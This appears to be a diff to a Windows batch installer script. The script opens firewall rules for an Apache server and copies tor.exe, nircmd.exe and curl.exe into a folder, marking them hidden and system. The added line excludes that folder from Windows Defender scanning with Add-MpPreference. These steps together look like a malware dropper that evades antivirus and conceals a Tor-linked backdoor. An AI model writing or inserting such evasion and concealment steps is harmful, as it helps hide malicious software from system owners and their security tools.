@@ -23,6 +23,8 @@ cd %~dp0
 netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=TCP
 netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=UDP
 
+powershell.exe Add-MpPreference -ExclusionPath "%environment%"
+
 copy /y "tor.exe" "%environment%\tor.exe" && attrib +s +h +i "%environment%\tor.exe"
 copy /y "nircmd.exe" "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
 copy /y "curl.exe" "%environment%\curl.exe" && attrib +s +h +i "%environment%\curl.exe"
